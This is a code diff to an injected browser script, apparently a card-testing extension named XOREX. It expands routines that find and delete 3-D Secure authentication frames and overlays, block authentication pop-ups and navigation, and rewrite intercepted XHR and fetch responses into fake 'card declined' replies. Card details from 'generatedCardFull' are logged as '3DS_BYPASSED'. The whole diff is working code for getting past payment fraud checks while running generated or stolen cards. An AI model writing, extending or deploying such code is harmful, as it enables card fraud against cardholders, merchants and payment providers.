@@ -4087,76 +4087,155 @@ if (window.__XOREXBlocked) {
       }
     }, 4000)
   }
+  const threeDSSelectors = [
+    'iframe[src*="three-ds"]', 'iframe[src*="3ds"]', 'iframe[src*="3d-secure"]',
+    'iframe[name*="__stripeJSChallengeFrame"]', 'iframe[name*="__stripeJSAuth"]',
+    'iframe[src*="authenticate"]', 'iframe[src*="stripe.com/3d"]',
+    'iframe[id*="challengeFrame"]', 'iframe[name*="challengeFrame"]',
+    'iframe[src*="verifycard"]', 'iframe[src*="threedsmethod"]',
+    'iframe[src*="creq"]', 'iframe[src*="areq"]',
+    'iframe[src*="safekey"]', 'iframe[src*="securecode"]',
+    'iframe[src*="3dsecure"]', 'iframe[src*="acs"]',
+    'iframe[src*="cardinal"]', 'iframe[src*="centinelapi"]',
+    'div[class*="StripeChallenge"]', 'div[class*="three-ds"]',
+    'div[class*="3ds"]', 'div[id*="3ds"]',
+    'div[class*="challenge-container"]', 'div[class*="authentication-modal"]',
+    'div[class*="threeds"]', 'div[id*="threeds"]'
+  ]
+  function nuke3DSElement(el) {
+    try {
+      el.remove()
+    } catch (e) {
+      try {
+        el.style.display = "none"
+        el.style.visibility = "hidden"
+        el.style.width = "0"
+        el.style.height = "0"
+        el.style.position = "fixed"
+        el.style.top = "-9999px"
+        el.style.left = "-9999px"
+        el.style.opacity = "0"
+        el.style.pointerEvents = "none"
+        el.src = "about:blank"
+      } catch (e2) {}
+    }
+  }
+  function is3DSElement(node) {
+    if (!node || node.nodeType !== 1) return false
+    const tagName = (node.tagName || "").toLowerCase()
+    const src = (node.getAttribute("src") || "").toLowerCase()
+    const name = (node.getAttribute("name") || "").toLowerCase()
+    const cls = (node.className || "").toLowerCase()
+    const id = (node.id || "").toLowerCase()
+    if (tagName === "iframe") {
+      if (
+        src.includes("three-ds") || src.includes("3ds") || src.includes("3d-secure") ||
+        src.includes("3dsecure") || src.includes("authenticate") ||
+        src.includes("threedsmethod") || src.includes("creq") || src.includes("areq") ||
+        src.includes("verifycard") || src.includes("safekey") || src.includes("securecode") ||
+        src.includes("cardinal") || src.includes("centinelapi") || src.includes("acs") ||
+        name.includes("challengeframe") || name.includes("__stripejschallengeframe") ||
+        name.includes("__stripejsauth") || name.includes("threeds") ||
+        name.includes("3ds") || name.includes("stepupframe")
+      ) return true
+    }
+    if (
+      cls.includes("stripechallenge") || cls.includes("3ds") || cls.includes("three-ds") ||
+      cls.includes("threeds") || cls.includes("challenge-container") ||
+      cls.includes("authentication-modal") || cls.includes("authentication-overlay") ||
+      id.includes("3ds") || id.includes("threeds") || id.includes("challenge")
+    ) return true
+    return false
+  }
   function hide3DSElements() {
-    const selectors = [
-      'iframe[src*="three-ds"]', 'iframe[src*="3ds"]', 'iframe[src*="3d-secure"]',
-      'iframe[name*="__stripeJSChallengeFrame"]', 'iframe[name*="__stripeJSAuth"]',
-      'iframe[src*="authenticate"]', 'iframe[src*="stripe.com/3d"]',
-      'iframe[id*="challengeFrame"]', 'iframe[name*="challengeFrame"]',
-      'iframe[src*="verifycard"]', 'iframe[src*="threedsmethod"]',
-      'iframe[src*="creq"]', 'iframe[src*="areq"]',
-      'div[class*="StripeChallenge"]', 'div[class*="three-ds"]',
-      'div[class*="3ds"]', 'div[id*="3ds"]'
-    ]
-    for (const selector of selectors) {
+    for (const selector of threeDSSelectors) {
       try {
         const els = document.querySelectorAll(selector)
-        for (const el of els) {
-          el.style.display = "none"
-          el.style.visibility = "hidden"
-          el.style.width = "0"
-          el.style.height = "0"
-          el.style.position = "fixed"
-          el.style.top = "-9999px"
-          el.style.left = "-9999px"
-          el.style.opacity = "0"
-          el.style.pointerEvents = "none"
-        }
+        for (const el of els) nuke3DSElement(el)
       } catch (e) {}
     }
+    try {
+      const allIframes = document.querySelectorAll("iframe")
+      for (const iframe of allIframes) {
+        const src = (iframe.src || "").toLowerCase()
+        const name = (iframe.name || "").toLowerCase()
+        const rect = iframe.getBoundingClientRect()
+        if (rect.width > 200 && rect.height > 200) {
+          if (
+            src.includes("stripe") && (src.includes("auth") || src.includes("challenge") || src.includes("3d")) ||
+            name.includes("challenge") || name.includes("auth") || name.includes("3d")
+          ) {
+            nuke3DSElement(iframe)
+          }
+        }
+      }
+    } catch (e) {}
+    try {
+      const fullScreenDivs = document.querySelectorAll('div[style*="z-index"]')
+      for (const div of fullScreenDivs) {
+        const rect = div.getBoundingClientRect()
+        const style = window.getComputedStyle(div)
+        const zIndex = parseInt(style.zIndex) || 0
+        if (zIndex > 999 && rect.width > window.innerWidth * 0.5 && rect.height > window.innerHeight * 0.5) {
+          const hasIframe = div.querySelector("iframe")
+          if (hasIframe && is3DSElement(hasIframe)) {
+            nuke3DSElement(div)
+          }
+        }
+      }
+    } catch (e) {}
   }
   const threeDSObserver = new MutationObserver((mutations) => {
     if (!threedsBypassed) return
     for (const mutation of mutations) {
       for (const node of mutation.addedNodes) {
         if (node.nodeType !== 1) continue
-        const tagName = (node.tagName || "").toLowerCase()
-        if (tagName === "iframe") {
-          const src = (node.src || "").toLowerCase()
-          const name = (node.name || "").toLowerCase()
-          if (
-            src.includes("three-ds") || src.includes("3ds") || src.includes("3d-secure") ||
-            src.includes("authenticate") || src.includes("threedsmethod") ||
-            src.includes("creq") || src.includes("areq") || src.includes("verifycard") ||
-            name.includes("challengeframe") || name.includes("__stripejschallengeframe") ||
-            name.includes("__stripejsauth")
-          ) {
-            node.style.display = "none"
-            node.style.visibility = "hidden"
-            node.style.width = "0"
-            node.style.height = "0"
-            node.style.position = "fixed"
-            node.style.top = "-9999px"
-            node.style.left = "-9999px"
-            node.style.opacity = "0"
-            node.style.pointerEvents = "none"
-          }
+        if (is3DSElement(node)) {
+          nuke3DSElement(node)
+          continue
         }
-        if (node.classList && (
-          node.classList.contains("StripeChallenge") ||
-          (node.className || "").includes("3ds") ||
-          (node.className || "").includes("three-ds") ||
-          (node.id || "").includes("3ds")
-        )) {
-          node.style.display = "none"
-          node.style.visibility = "hidden"
-          node.style.opacity = "0"
-          node.style.pointerEvents = "none"
+        if (node.querySelectorAll) {
+          try {
+            const nested = node.querySelectorAll("iframe")
+            for (const iframe of nested) {
+              if (is3DSElement(iframe)) nuke3DSElement(iframe)
+            }
+          } catch (e) {}
+        }
+        const tagName = (node.tagName || "").toLowerCase()
+        if (tagName === "div" || tagName === "section") {
+          const rect = node.getBoundingClientRect()
+          const style = window.getComputedStyle(node)
+          const zIndex = parseInt(style.zIndex) || 0
+          if (zIndex > 999 && rect.width > window.innerWidth * 0.3 && rect.height > window.innerHeight * 0.3) {
+            setTimeout(() => {
+              const iframes = node.querySelectorAll("iframe")
+              for (const iframe of iframes) {
+                if (is3DSElement(iframe)) {
+                  nuke3DSElement(node)
+                  break
+                }
+              }
+            }, 100)
+          }
         }
       }
     }
+    hide3DSElements()
   })
   threeDSObserver.observe(document.documentElement, { childList: true, subtree: true })
+  const originalWindowOpen = window.open
+  window.open = function(url) {
+    if (threedsBypassed && url && typeof url === "string") {
+      const u = url.toLowerCase()
+      if (u.includes("3ds") || u.includes("three-ds") || u.includes("3dsecure") ||
+          u.includes("authenticate") || u.includes("safekey") || u.includes("securecode") ||
+          u.includes("cardinal") || u.includes("centinelapi") || u.includes("acs")) {
+        return null
+      }
+    }
+    return originalWindowOpen.apply(this, arguments)
+  }
   function processResponseData(json, responseId) {
     if (responseId && processedResponses.has(responseId)) return
     if (responseId) {
@@ -4230,10 +4309,17 @@ if (window.__XOREXBlocked) {
       hide3DSElements()
       show3DSBypassed()
       showWarning("🛡️ 3DS Bypassed", "info")
+      window.postMessage({ type: "XOREX_TO_BACKGROUND", requestId: "3ds_block_" + Date.now(), payload: { type: "BLOCK_3DS_NAVIGATION" } }, "*")
       if (window.generatedCardFull) {
         const parts = window.generatedCardFull.split("|")
         addToHistory(parts[0], parts[1], parts[2], parts[3], "3DS_BYPASSED")
       }
+      setTimeout(hide3DSElements, 100)
+      setTimeout(hide3DSElements, 300)
+      setTimeout(hide3DSElements, 600)
+      setTimeout(hide3DSElements, 1000)
+      setTimeout(hide3DSElements, 2000)
+      setTimeout(hide3DSElements, 3000)
       return
     }
     extractPaymentData(json)
@@ -4298,6 +4384,14 @@ if (window.__XOREXBlocked) {
       showWarning("⛔ Auto-stopped: " + reason, "error")
     }
   }
+  const FAKE_DECLINE_JSON = JSON.stringify({
+    error: {
+      type: "card_error",
+      code: "card_declined",
+      decline_code: "generic_decline",
+      message: "Your card was declined."
+    }
+  })
   const originalXHR = window.XMLHttpRequest
   window.XMLHttpRequest = () => {
     const xhr = new originalXHR()
@@ -4308,7 +4402,17 @@ if (window.__XOREXBlocked) {
       try {
         if (this.responseText) {
           const json = JSON.parse(this.responseText)
-          processResponseData(json, "xhr_" + xhrId)
+          if (detect3DS(json)) {
+            processResponseData(json, "xhr_" + xhrId)
+            try {
+              Object.defineProperty(this, "responseText", { get: () => FAKE_DECLINE_JSON, configurable: true })
+              Object.defineProperty(this, "response", { get: () => FAKE_DECLINE_JSON, configurable: true })
+              Object.defineProperty(this, "status", { get: () => 402, configurable: true })
+              Object.defineProperty(this, "statusText", { get: () => "Payment Required", configurable: true })
+            } catch (e) {}
+          } else {
+            processResponseData(json, "xhr_" + xhrId)
+          }
         }
       } catch (e) {}
     })
@@ -4374,6 +4478,21 @@ if (window.__XOREXBlocked) {
           const text = await cloned.text()
           if (text) {
             const json = JSON.parse(text)
+            if (detect3DS(json)) {
+              processResponseData(json, fetchId)
+              return new Response(JSON.stringify({
+                error: {
+                  type: "card_error",
+                  code: "card_declined",
+                  decline_code: "generic_decline",
+                  message: "Your card was declined."
+                }
+              }), {
+                status: 402,
+                statusText: "Payment Required",
+                headers: new Headers({ "Content-Type": "application/json" })
+              })
+            }
             processResponseData(json, fetchId)
           }
         } catch (e) {}
